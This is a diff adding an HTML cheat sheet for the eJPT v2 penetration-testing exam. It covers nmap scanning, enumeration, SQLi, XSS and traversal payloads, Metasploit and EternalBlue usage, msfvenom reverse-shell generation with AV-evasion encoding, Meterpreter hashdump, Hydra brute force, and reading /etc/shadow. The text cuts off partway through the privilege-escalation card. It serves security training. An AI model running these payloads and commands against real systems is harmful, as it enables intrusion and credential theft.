@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>eJPT v2 Cheat Sheet — eLearnSecurity Junior Penetration Tester</title>
+<meta name="description" content="Complete eJPT v2 field reference: scanning, enumeration, exploitation, Metasploit, pivoting, privilege escalation, and exam tips.">
+<style>
+:root {
+  --bg:#F5F6F7; --surface:#FFFFFF; --border:#E2E4E8;
+  --navy:#0F1C2E; --navy2:#1A2E45;
+  --red:#B91C1C; --red-soft:#FEF2F2;
+  --orange:#EA580C; --orange-soft:#FFF7ED;
+  --blue:#1A6FB5; --blue-soft:#EBF4FF;
+  --green:#1B7A4A; --green-soft:#E8F7EF;
+  --purple:#6B21A8; --purple-soft:#F5F0FF;
+  --text:#1C2333; --text2:#4A5568; --text3:#718096;
+  --mono:'Consolas','Courier New',monospace;
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body { font-family:var(--sans); font-size:11px; background:var(--bg); color:var(--text); line-height:1.5; }
+.page { max-width:1280px; margin:0 auto; padding:20px 16px; }
+.header { background:var(--navy); border-radius:10px; padding:20px 24px; margin-bottom:16px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; }
+.header-left h1 { font-size:22px; font-weight:800; color:#fff; }
+.header-left h1 span { color:#F87171; }
+.header-left p { font-size:11px; color:#94A3B8; margin-top:3px; }
+.header-badges { display:flex; gap:8px; flex-wrap:wrap; }
+.badge { font-size:10px; font-weight:700; padding:4px 10px; border-radius:20px; letter-spacing:.5px; text-transform:uppercase; }
+.badge-red { background:#EF4444; color:#fff; }
+.badge-orange { background:#F97316; color:#fff; }
+.badge-purple { background:#A855F7; color:#fff; }
+.badge-blue { background:#3B82F6; color:#fff; }
+.grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:12px; }
+.grid-2 { grid-template-columns:repeat(2,1fr); }
+.grid-4 { grid-template-columns:repeat(4,1fr); }
+.grid-1 { grid-template-columns:1fr; }
+.card { background:var(--surface); border-radius:8px; border:1px solid var(--border); overflow:hidden; }
+.card-header { padding:8px 12px; display:flex; align-items:center; gap:8px; border-bottom:1px solid var(--border); }
+.card-header .icon { width:24px; height:24px; border-radius:5px; display:flex; align-items:center; justify-content:center; font-size:12px; flex-shrink:0; }
+.icon-red { background:var(--red-soft); }
+.icon-blue { background:var(--blue-soft); }
+.icon-green { background:var(--green-soft); }
+.icon-orange { background:var(--orange-soft); }
+.icon-purple { background:var(--purple-soft); }
+.icon-navy { background:#E8EDF3; }
+.card-header h2 { font-size:11.5px; font-weight:800; color:var(--navy); }
+.card-header .sub { font-size:9px; color:var(--text3); margin-left:auto; white-space:nowrap; }
+.card-body { padding:10px 12px; }
+.section-label { font-size:8.5px; font-weight:800; text-transform:uppercase; letter-spacing:1px; color:var(--text3); margin-bottom:5px; margin-top:9px; }
+.section-label:first-child { margin-top:0; }
+.row { display:flex; justify-content:space-between; align-items:baseline; padding:2px 0; border-bottom:1px solid #F1F3F5; gap:8px; }
+.row:last-child { border-bottom:none; }
+.row .key { font-family:var(--mono); font-size:10px; font-weight:600; color:var(--navy); white-space:nowrap; flex-shrink:0; }
+.row .val { font-size:10px; color:var(--text2); text-align:right; }
+.tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:4px; }
+.tag { font-size:9.5px; padding:2px 7px; border-radius:4px; font-weight:600; font-family:var(--mono); }
+.tag-red { background:var(--red-soft); color:#991B1B; }
+.tag-orange { background:var(--orange-soft); color:#9A3412; }
+.tag-blue { background:var(--blue-soft); color:#1E40AF; }
+.tag-green { background:var(--green-soft); color:#14532D; }
+.tag-purple { background:var(--purple-soft); color:#6B21A8; }
+.tag-navy { background:#E8EDF3; color:var(--navy); }
+.tip-bar { background:var(--navy2); border-radius:8px; padding:10px 16px; margin-bottom:16px; display:flex; gap:24px; flex-wrap:wrap; align-items:flex-start; }
+.tip-item { display:flex; flex-direction:column; gap:2px; min-width:180px; flex:1; }
+.tip-label { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:1px; color:#F87171; }
+.tip { font-size:10.5px; color:#CBD5E1; }
+.tip b { color:#fff; }
+.note { font-size:10px; color:var(--text2); padding:6px 8px; border-radius:4px; margin-top:4px; }
+.note-red { background:var(--red-soft); border-left:3px solid var(--red); }
+.note-orange { background:var(--orange-soft); border-left:3px solid var(--orange); }
+.note-blue { background:var(--blue-soft); border-left:3px solid var(--blue); }
+.note-green { background:var(--green-soft); border-left:3px solid var(--green); }
+.cmd { font-family:var(--mono); font-size:10px; background:#F1F3F5; padding:3px 7px; border-radius:4px; color:var(--navy); display:block; margin:2px 0; word-break:break-all; }
+.cmd-block { overflow-x:auto; }
+.phase-strip { display:flex; gap:0; margin-bottom:12px; border-radius:8px; overflow:hidden; border:1px solid var(--border); }
+.phase-step { flex:1; padding:7px 10px; background:var(--surface); text-align:center; border-right:1px solid var(--border); position:relative; }
+.phase-step:last-child { border-right:none; }
+.phase-step .pnum { font-size:8px; font-weight:800; text-transform:uppercase; letter-spacing:.8px; color:var(--text3); }
+.phase-step .pname { font-size:10.5px; font-weight:700; color:var(--navy); margin-top:1px; }
+.phase-step .parrow { position:absolute; right:-8px; top:50%; transform:translateY(-50%); font-size:10px; color:var(--text3); z-index:1; }
+.phase-step.active-recon { border-top:3px solid var(--blue); }
+.phase-step.active-scan { border-top:3px solid var(--orange); }
+.phase-step.active-enum { border-top:3px solid var(--purple); }
+.phase-step.active-exploit { border-top:3px solid var(--red); }
+.phase-step.active-post { border-top:3px solid var(--green); }
+.phase-step.active-flag { border-top:3px solid #F59E0B; }
+.divider { border:none; border-top:1px solid var(--border); margin:6px 0; }
+table { width:100%; border-collapse:collapse; font-size:10px; }
+table th { font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:.6px; color:var(--text3); padding:4px 6px; border-bottom:1px solid var(--border); text-align:left; }
+table td { padding:3px 6px; border-bottom:1px solid #F1F3F5; color:var(--text2); font-variant-numeric:tabular-nums; }
+table td:first-child { font-family:var(--mono); font-weight:600; color:var(--navy); }
+table tr:last-child td { border-bottom:none; }
+.two-col { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+.footer { text-align:center; padding:12px; font-size:9.5px; color:var(--text3); margin-top:4px; }
+.footer a { color:var(--blue); text-decoration:none; }
+@media (max-width:900px) {
+  .grid { grid-template-columns:repeat(2,1fr); }
+  .grid-4 { grid-template-columns:repeat(2,1fr); }
+  .phase-strip { flex-wrap:wrap; }
+}
+@media (max-width:600px) {
+  .grid,.grid-2,.grid-4 { grid-template-columns:1fr; }
+  .two-col { grid-template-columns:1fr; }
+}
+@media print {
+  body { background:#fff; font-size:9px; }
+  .page { padding:0; }
+  .header { border-radius:0; }
+  .tip-bar { break-inside:avoid; }
+  .card { break-inside:avoid; }
+}
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="header-left">
+      <h1>eJPT v2 <span>Cheat Sheet</span></h1>
+      <p>eLearnSecurity Junior Penetration Tester &mdash; Complete Field Reference</p>
+    </div>
+    <div class="header-badges">
+      <span class="badge badge-red">Practical Exam</span>
+      <span class="badge badge-orange">48 Hours</span>
+      <span class="badge badge-purple">70% Pass</span>
+      <span class="badge badge-blue">$200 USD</span>
+    </div>
+  </div>
+
+  <!-- EXAM TIP BAR -->
+  <div class="tip-bar">
+    <div class="tip-item">
+      <span class="tip-label">Exam Strategy</span>
+      <span class="tip"><b>Read all 35 questions first</b> before touching a single tool — map what you need to find.</span>
+    </div>
+    <div class="tip-item">
+      <span class="tip-label">Metasploit</span>
+      <span class="tip"><b>Metasploit is fully allowed</b> — use it freely for exploitation and post-exploitation.</span>
+    </div>
+    <div class="tip-item">
+      <span class="tip-label">Documentation</span>
+      <span class="tip"><b>Document everything</b>: IPs, open ports, credentials, flags found. Use a text file.</span>
+    </div>
+    <div class="tip-item">
+      <span class="tip-label">Passing Score</span>
+      <span class="tip">Need <b>20 of 35 correct flags</b> (70%). Don&apos;t get stuck — move on and return.</span>
+    </div>
+    <div class="tip-item">
+      <span class="tip-label">Scope</span>
+      <span class="tip">Entry-level cert — <b>no advanced exploitation</b> required. Enumeration wins most flags.</span>
+    </div>
+  </div>
+
+  <!-- CTF METHODOLOGY PHASE STRIP -->
+  <div class="phase-strip">
+    <div class="phase-step active-recon">
+      <div class="pnum">Phase 1</div>
+      <div class="pname">Recon</div>
+      <div class="parrow">&#9654;</div>
+    </div>
+    <div class="phase-step active-scan">
+      <div class="pnum">Phase 2</div>
+      <div class="pname">Scan</div>
+      <div class="parrow">&#9654;</div>
+    </div>
+    <div class="phase-step active-enum">
+      <div class="pnum">Phase 3</div>
+      <div class="pname">Enumerate</div>
+      <div class="parrow">&#9654;</div>
+    </div>
+    <div class="phase-step active-exploit">
+      <div class="pnum">Phase 4</div>
+      <div class="pname">Exploit</div>
+      <div class="parrow">&#9654;</div>
+    </div>
+    <div class="phase-step active-post">
+      <div class="pnum">Phase 5</div>
+      <div class="pname">Post-Exploit</div>
+      <div class="parrow">&#9654;</div>
+    </div>
+    <div class="phase-step active-flag">
+      <div class="pnum">Phase 6</div>
+      <div class="pname">Capture Flag</div>
+    </div>
+  </div>
+
+  <!-- ROW 1: Networking + Common Ports + Scanning -->
+  <div class="grid">
+
+    <!-- Networking Basics -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-blue">&#127760;</div>
+        <h2>Networking Basics</h2>
+        <span class="sub">TCP/IP &amp; OSI</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">TCP/IP Model (4 Layers)</div>
+        <div class="row"><span class="key">Application</span><span class="val">HTTP, DNS, FTP, SSH, SMTP</span></div>
+        <div class="row"><span class="key">Transport</span><span class="val">TCP (reliable), UDP (fast)</span></div>
+        <div class="row"><span class="key">Internet</span><span class="val">IP, ICMP, ARP routing</span></div>
+        <div class="row"><span class="key">Network Access</span><span class="val">Ethernet, Wi-Fi frames</span></div>
+
+        <div class="section-label">OSI Model (7 Layers)</div>
+        <div class="row"><span class="key">7 — Application</span><span class="val">User-facing protocols</span></div>
+        <div class="row"><span class="key">6 — Presentation</span><span class="val">Encoding, encryption, TLS</span></div>
+        <div class="row"><span class="key">5 — Session</span><span class="val">Session mgmt, NetBIOS</span></div>
+        <div class="row"><span class="key">4 — Transport</span><span class="val">TCP/UDP, ports, segments</span></div>
+        <div class="row"><span class="key">3 — Network</span><span class="val">IP addressing, routing</span></div>
+        <div class="row"><span class="key">2 — Data Link</span><span class="val">MAC addresses, switches</span></div>
+        <div class="row"><span class="key">1 — Physical</span><span class="val">Cables, hubs, signals</span></div>
+
+        <div class="section-label">Subnetting &amp; CIDR</div>
+        <div class="row"><span class="key">/24</span><span class="val">255.255.255.0 — 254 hosts</span></div>
+        <div class="row"><span class="key">/16</span><span class="val">255.255.0.0 — 65,534 hosts</span></div>
+        <div class="row"><span class="key">/8</span><span class="val">255.0.0.0 — 16.7M hosts</span></div>
+        <div class="row"><span class="key">/30</span><span class="val">255.255.255.252 — 2 hosts</span></div>
+        <div class="note note-blue">Private ranges: 10.0.0.0/8 &bull; 172.16.0.0/12 &bull; 192.168.0.0/16</div>
+      </div>
+    </div>
+
+    <!-- Common Ports -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-navy">&#128268;</div>
+        <h2>Common Ports</h2>
+        <span class="sub">Know these cold</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Well-Known Service Ports</div>
+        <table>
+          <thead>
+            <tr><th>Port</th><th>Proto</th><th>Service</th><th>Notes</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>21</td><td>TCP</td><td>FTP</td><td>Try anon login</td></tr>
+            <tr><td>22</td><td>TCP</td><td>SSH</td><td>Brute-force target</td></tr>
+            <tr><td>23</td><td>TCP</td><td>Telnet</td><td>Cleartext creds</td></tr>
+            <tr><td>25</td><td>TCP</td><td>SMTP</td><td>Mail relay, enum</td></tr>
+            <tr><td>53</td><td>TCP/UDP</td><td>DNS</td><td>Zone transfer</td></tr>
+            <tr><td>80</td><td>TCP</td><td>HTTP</td><td>Web app testing</td></tr>
+            <tr><td>110</td><td>TCP</td><td>POP3</td><td>Email retrieval</td></tr>
+            <tr><td>139</td><td>TCP</td><td>NetBIOS</td><td>SMB/Windows</td></tr>
+            <tr><td>143</td><td>TCP</td><td>IMAP</td><td>Email access</td></tr>
+            <tr><td>443</td><td>TCP</td><td>HTTPS</td><td>TLS web traffic</td></tr>
+            <tr><td>445</td><td>TCP</td><td>SMB</td><td>File shares, EternalBlue</td></tr>
+            <tr><td>3306</td><td>TCP</td><td>MySQL</td><td>DB enumeration</td></tr>
+            <tr><td>3389</td><td>TCP</td><td>RDP</td><td>Remote desktop</td></tr>
+            <tr><td>5432</td><td>TCP</td><td>PostgreSQL</td><td>Database</td></tr>
+            <tr><td>8080</td><td>TCP</td><td>HTTP-Alt</td><td>Proxy / dev servers</td></tr>
+          </tbody>
+        </table>
+        <div class="note note-orange" style="margin-top:6px;">Always run <code style="font-family:var(--mono);">-p-</code> for full port range — services hide on non-standard ports.</div>
+      </div>
+    </div>
+
+    <!-- Network Scanning -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-orange">&#128269;</div>
+        <h2>Network Scanning</h2>
+        <span class="sub">Nmap &amp; discovery</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Host Discovery</div>
+        <code class="cmd">nmap -sn 192.168.1.0/24</code>
+        <code class="cmd">netdiscover -r 192.168.1.0/24</code>
+        <code class="cmd">arp-scan -l</code>
+
+        <div class="section-label">Port &amp; Service Scans</div>
+        <code class="cmd">nmap -sV -sC -p- &lt;target&gt;</code>
+        <code class="cmd">nmap -A -T4 &lt;target&gt;</code>
+        <code class="cmd">nmap -sU --top-ports 100 &lt;target&gt;</code>
+
+        <div class="section-label">Vulnerability Scanning</div>
+        <code class="cmd">nmap --script=vuln &lt;target&gt;</code>
+        <code class="cmd">nmap --script=smb-vuln* &lt;target&gt;</code>
+        <code class="cmd">nmap --script=http-enum &lt;target&gt;</code>
+
+        <div class="section-label">Nmap Flag Reference</div>
+        <div class="row"><span class="key">-sS</span><span class="val">SYN (stealth) scan</span></div>
+        <div class="row"><span class="key">-sT</span><span class="val">TCP connect (full)</span></div>
+        <div class="row"><span class="key">-sU</span><span class="val">UDP scan</span></div>
+        <div class="row"><span class="key">-sV</span><span class="val">Service/version detection</span></div>
+        <div class="row"><span class="key">-sC</span><span class="val">Default scripts</span></div>
+        <div class="row"><span class="key">-A</span><span class="val">OS + version + scripts + traceroute</span></div>
+        <div class="row"><span class="key">-T4</span><span class="val">Faster timing template</span></div>
+        <div class="row"><span class="key">-oN</span><span class="val">Save output to file</span></div>
+        <div class="row"><span class="key">-p-</span><span class="val">All 65535 ports</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW 2: Service Enumeration x2 + Web Testing -->
+  <div class="grid">
+
+    <!-- Service Enumeration: FTP / SSH / SMB -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-purple">&#128196;</div>
+        <h2>Service Enumeration</h2>
+        <span class="sub">FTP / SSH / SMB</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">FTP (Port 21)</div>
+        <code class="cmd">ftp &lt;target&gt;</code>
+        <code class="cmd">ftp &lt;target&gt; 21</code>
+        <div class="note note-blue">Username: <strong>anonymous</strong> &bull; Password: (blank or any email)</div>
+        <div class="tags" style="margin-top:4px;">
+          <span class="tag tag-navy">ls / dir</span>
+          <span class="tag tag-navy">get &lt;file&gt;</span>
+          <span class="tag tag-navy">mget *</span>
+          <span class="tag tag-navy">put &lt;file&gt;</span>
+          <span class="tag tag-navy">binary</span>
+        </div>
+
+        <div class="section-label">SSH (Port 22)</div>
+        <code class="cmd">ssh user@&lt;target&gt;</code>
+        <code class="cmd">ssh -i id_rsa user@&lt;target&gt;</code>
+        <code class="cmd">ssh-keygen -t rsa</code>
+        <code class="cmd">ssh user@&lt;target&gt; -p 2222</code>
+        <div class="note note-orange">Permissions: <code style="font-family:var(--mono);">chmod 600 id_rsa</code> before using key.</div>
+
+        <div class="section-label">SMB (Ports 139 / 445)</div>
+        <code class="cmd">smbclient -L //&lt;target&gt; -N</code>
+        <code class="cmd">smbclient //&lt;target&gt;/share -N</code>
+        <code class="cmd">smbclient //&lt;target&gt;/share -U user</code>
+        <code class="cmd">enum4linux -a &lt;target&gt;</code>
+        <code class="cmd">nmap --script=smb-enum-shares &lt;target&gt;</code>
+        <div class="tags" style="margin-top:4px;">
+          <span class="tag tag-navy">ls</span>
+          <span class="tag tag-navy">get file</span>
+          <span class="tag tag-navy">put file</span>
+          <span class="tag tag-navy">cd dir</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Service Enumeration: HTTP / DNS -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-blue">&#127758;</div>
+        <h2>Web Enumeration</h2>
+        <span class="sub">HTTP / DNS / HTTPS</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Directory Brute-Force</div>
+        <code class="cmd">dirb http://&lt;target&gt;/</code>
+        <code class="cmd">gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>
+        <code class="cmd">gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</code>
+        <code class="cmd">feroxbuster -u http://&lt;target&gt; -w /wordlist.txt</code>
+
+        <div class="section-label">DNS Enumeration</div>
+        <code class="cmd">dig axfr @&lt;dns-server&gt; &lt;domain&gt;</code>
+        <code class="cmd">dnsenum &lt;domain&gt;</code>
+        <code class="cmd">nslookup &lt;domain&gt; &lt;dns-server&gt;</code>
+        <code class="cmd">host -t ns &lt;domain&gt;</code>
+
+        <div class="section-label">HTTP Methods</div>
+        <div class="tags">
+          <span class="tag tag-blue">GET</span>
+          <span class="tag tag-blue">POST</span>
+          <span class="tag tag-orange">PUT</span>
+          <span class="tag tag-orange">DELETE</span>
+          <span class="tag tag-navy">PATCH</span>
+          <span class="tag tag-navy">OPTIONS</span>
+          <span class="tag tag-navy">HEAD</span>
+        </div>
+
+        <div class="section-label">Useful cURL Commands</div>
+        <code class="cmd">curl -I http://&lt;target&gt;</code>
+        <code class="cmd">curl -X OPTIONS http://&lt;target&gt; -v</code>
+        <code class="cmd">curl -d "user=admin&pass=admin" -X POST http://&lt;target&gt;/login</code>
+        <code class="cmd">curl -b "session=TOKEN" http://&lt;target&gt;/admin</code>
+
+        <div class="section-label">Nikto Web Scanner</div>
+        <code class="cmd">nikto -h http://&lt;target&gt;</code>
+        <code class="cmd">nikto -h http://&lt;target&gt; -p 8080</code>
+      </div>
+    </div>
+
+    <!-- Web App Testing: SQLi + XSS + Traversal -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-red">&#9888;</div>
+        <h2>Web App Attacks</h2>
+        <span class="sub">SQLi / XSS / Traversal</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">OWASP Top 10 (2021)</div>
+        <div class="row"><span class="key">A01</span><span class="val">Broken Access Control</span></div>
+        <div class="row"><span class="key">A02</span><span class="val">Cryptographic Failures</span></div>
+        <div class="row"><span class="key">A03</span><span class="val">Injection (SQLi, XSS)</span></div>
+        <div class="row"><span class="key">A04</span><span class="val">Insecure Design</span></div>
+        <div class="row"><span class="key">A05</span><span class="val">Security Misconfiguration</span></div>
+        <div class="row"><span class="key">A06</span><span class="val">Vulnerable Components</span></div>
+        <div class="row"><span class="key">A07</span><span class="val">Auth &amp; Session Failures</span></div>
+        <div class="row"><span class="key">A08</span><span class="val">Integrity Failures (SSTI)</span></div>
+        <div class="row"><span class="key">A09</span><span class="val">Logging/Monitoring Failures</span></div>
+        <div class="row"><span class="key">A10</span><span class="val">SSRF</span></div>
+
+        <div class="section-label">SQL Injection</div>
+        <code class="cmd">' OR '1'='1</code>
+        <code class="cmd">' OR '1'='1' --</code>
+        <code class="cmd">admin'--</code>
+        <code class="cmd">sqlmap -u "http://target/page?id=1" --dbs</code>
+        <code class="cmd">sqlmap -u "http://target/page?id=1" -D dbname --tables</code>
+        <code class="cmd">sqlmap -u "http://target/page?id=1" -D db -T users --dump</code>
+
+        <div class="section-label">XSS — Reflected &amp; Stored</div>
+        <code class="cmd">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+        <code class="cmd">&lt;img src=x onerror=alert(1)&gt;</code>
+        <div class="note note-blue"><strong>Reflected XSS</strong>: payload in URL, executes once. <strong>Stored XSS</strong>: payload saved in DB, executes on every view.</div>
+
+        <div class="section-label">Directory Traversal</div>
+        <code class="cmd">../../../etc/passwd</code>
+        <code class="cmd">....//....//....//etc/passwd</code>
+        <code class="cmd">%2e%2e%2f%2e%2e%2fetc%2fpasswd</code>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW 3: Metasploit + msfvenom + Meterpreter -->
+  <div class="grid">
+
+    <!-- Metasploit Framework -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-red">&#128163;</div>
+        <h2>Metasploit Framework</h2>
+        <span class="sub">msfconsole workflow</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Startup &amp; Navigation</div>
+        <code class="cmd">msfconsole</code>
+        <code class="cmd">msfconsole -q</code>
+
+        <div class="section-label">Finding &amp; Loading Exploits</div>
+        <code class="cmd">search &lt;exploit_name&gt;</code>
+        <code class="cmd">search type:exploit platform:windows smb</code>
+        <code class="cmd">use exploit/windows/smb/ms17_010_eternalblue</code>
+        <code class="cmd">info</code>
+        <code class="cmd">show options</code>
+        <code class="cmd">show payloads</code>
+
+        <div class="section-label">Configuring &amp; Running</div>
+        <code class="cmd">set RHOSTS &lt;target-ip&gt;</code>
+        <code class="cmd">set RPORT &lt;port&gt;</code>
+        <code class="cmd">set LHOST &lt;attacker-ip&gt;</code>
+        <code class="cmd">set LPORT 4444</code>
+        <code class="cmd">set payload windows/meterpreter/reverse_tcp</code>
+        <code class="cmd">run</code>
+        <code class="cmd">exploit</code>
+        <code class="cmd">check</code>
+
+        <div class="section-label">Session Management</div>
+        <code class="cmd">sessions -l</code>
+        <code class="cmd">sessions -i 1</code>
+        <code class="cmd">sessions -k 1</code>
+        <code class="cmd">background</code>
+
+        <div class="section-label">Handler (Listener)</div>
+        <code class="cmd">use exploit/multi/handler</code>
+        <code class="cmd">set payload windows/meterpreter/reverse_tcp</code>
+        <code class="cmd">set LHOST &lt;attacker-ip&gt;</code>
+        <code class="cmd">set LPORT 4444</code>
+        <code class="cmd">run -j</code>
+        <div class="note note-orange">Use <code style="font-family:var(--mono);">run -j</code> to run handler as background job while keeping the console free.</div>
+      </div>
+    </div>
+
+    <!-- msfvenom Payloads -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-orange">&#128295;</div>
+        <h2>msfvenom Payloads</h2>
+        <span class="sub">Generate shellcode</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Windows Payloads</div>
+        <code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f exe -o shell.exe</code>
+        <code class="cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f exe -o shell64.exe</code>
+        <code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f asp -o shell.asp</code>
+
+        <div class="section-label">Linux Payloads</div>
+        <code class="cmd">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f elf -o shell.elf</code>
+        <code class="cmd">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f elf -o shell64.elf</code>
+
+        <div class="section-label">Web Payloads</div>
+        <code class="cmd">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f raw -o shell.php</code>
+        <code class="cmd">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f raw -o shell.jsp</code>
+        <code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f war -o shell.war</code>
+
+        <div class="section-label">Encoding (AV Evasion)</div>
+        <code class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe</code>
+
+        <div class="section-label">List Payloads / Formats</div>
+        <code class="cmd">msfvenom -l payloads | grep windows</code>
+        <code class="cmd">msfvenom -l formats</code>
+        <code class="cmd">msfvenom -l encoders</code>
+
+        <div class="note note-blue">After generating, serve with: <code style="font-family:var(--mono);">python3 -m http.server 8000</code> on attacker machine.</div>
+      </div>
+    </div>
+
+    <!-- Meterpreter Commands -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-green">&#128187;</div>
+        <h2>Meterpreter Commands</h2>
+        <span class="sub">Post-exploitation shell</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">System Information</div>
+        <code class="cmd">sysinfo</code>
+        <code class="cmd">getuid</code>
+        <code class="cmd">getpid</code>
+        <code class="cmd">ps</code>
+        <code class="cmd">getsystem</code>
+
+        <div class="section-label">File Operations</div>
+        <code class="cmd">pwd</code>
+        <code class="cmd">ls</code>
+        <code class="cmd">cd C:\\Users\\Administrator</code>
+        <code class="cmd">download &lt;file&gt;</code>
+        <code class="cmd">download C:\\flag.txt /tmp/flag.txt</code>
+        <code class="cmd">upload &lt;file&gt; C:\\Windows\\Temp\\</code>
+        <code class="cmd">search -f *.txt</code>
+        <code class="cmd">cat /etc/passwd</code>
+
+        <div class="section-label">Privilege &amp; Credential Dumping</div>
+        <code class="cmd">hashdump</code>
+        <code class="cmd">run post/windows/gather/hashdump</code>
+        <code class="cmd">run post/multi/recon/local_exploit_suggester</code>
+        <code class="cmd">run post/windows/gather/enum_logged_on_users</code>
+
+        <div class="section-label">Shell &amp; Sessions</div>
+        <code class="cmd">shell</code>
+        <code class="cmd">background</code>
+        <code class="cmd">sessions</code>
+        <code class="cmd">migrate &lt;pid&gt;</code>
+
+        <div class="section-label">Networking</div>
+        <code class="cmd">ifconfig</code>
+        <code class="cmd">ipconfig</code>
+        <code class="cmd">arp</code>
+        <code class="cmd">route</code>
+        <code class="cmd">portfwd add -l 3306 -p 3306 -r &lt;internal-ip&gt;</code>
+
+        <div class="note note-green">Use <code style="font-family:var(--mono);">help</code> inside Meterpreter for full command list grouped by category.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW 4: Password Attacks + Priv Esc + Pivoting -->
+  <div class="grid">
+
+    <!-- Password Attacks -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-red">&#128273;</div>
+        <h2>Password Attacks</h2>
+        <span class="sub">Hydra / John / Hashcat</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Hydra — Online Brute-Force</div>
+        <code class="cmd">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;target&gt;</code>
+        <code class="cmd">hydra -L users.txt -P pass.txt ftp://&lt;target&gt;</code>
+        <code class="cmd">hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</code>
+        <code class="cmd">hydra -l user -P rockyou.txt &lt;target&gt; smb</code>
+        <code class="cmd">hydra -l user -P rockyou.txt rdp://&lt;target&gt;</code>
+
+        <div class="section-label">John the Ripper — Offline Cracking</div>
+        <code class="cmd">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code>
+        <code class="cmd">john hash.txt --format=md5crypt --wordlist=rockyou.txt</code>
+        <code class="cmd">john --show hash.txt</code>
+        <code class="cmd">unshadow /etc/passwd /etc/shadow &gt; hashes.txt</code>
+        <code class="cmd">john hashes.txt --wordlist=rockyou.txt</code>
+
+        <div class="section-label">Hashcat — GPU Cracking</div>
+        <code class="cmd">hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt</code>
+        <code class="cmd">hashcat -m 1000 hash.txt rockyou.txt</code>
+        <code class="cmd">hashcat -m 0 hash.txt rockyou.txt --force</code>
+
+        <div class="section-label">Common Hash Mode (-m)</div>
+        <div class="row"><span class="key">0</span><span class="val">MD5</span></div>
+        <div class="row"><span class="key">100</span><span class="val">SHA-1</span></div>
+        <div class="row"><span class="key">1400</span><span class="val">SHA-256</span></div>
+        <div class="row"><span class="key">1000</span><span class="val">NTLM (Windows)</span></div>
+        <div class="row"><span class="key">1800</span><span class="val">SHA-512crypt (Linux)</span></div>
+        <div class="row"><span class="key">500</span><span class="val">MD5crypt ($1$)</span></div>
+
+        <div class="section-label">Hash Identification</div>
+        <code class="cmd">hash-identifier</code>
+        <code class="cmd">hashid &lt;hash&gt;</code>
+      </div>
+    </div>
+
+    <!-- Privilege Escalation -->
+    <div class="card">
+      <div class="card-header">
+        <div class="icon icon-orange">&#9650;</div>
+        <h2>Privilege Escalation</h2>
+        <span class="sub">Linux &amp; Windows basics</span>
+      </div>
+      <div class="card-body">
+        <div class="section-label">Linux — Initial Checks</div>
+        <code class="cmd">whoami && id</code>
+        <code class="cmd">uname -a</code>
+        <code class="cmd">cat /etc/os-release</code>
+        <code class="cmd">sudo -l</code>
+        <code class="cmd">cat /etc/passwd</code>
+        <code class="cmd">cat /etc/shadow</code>
+
+        <div class="section-label">SUID Binaries</div>
+        <code class="cmd">find / -perm -4000 2&gt;/dev/null</code>
+        <code class="cmd">find / -perm -u=s -type f 2&gt;/dev/null</code>
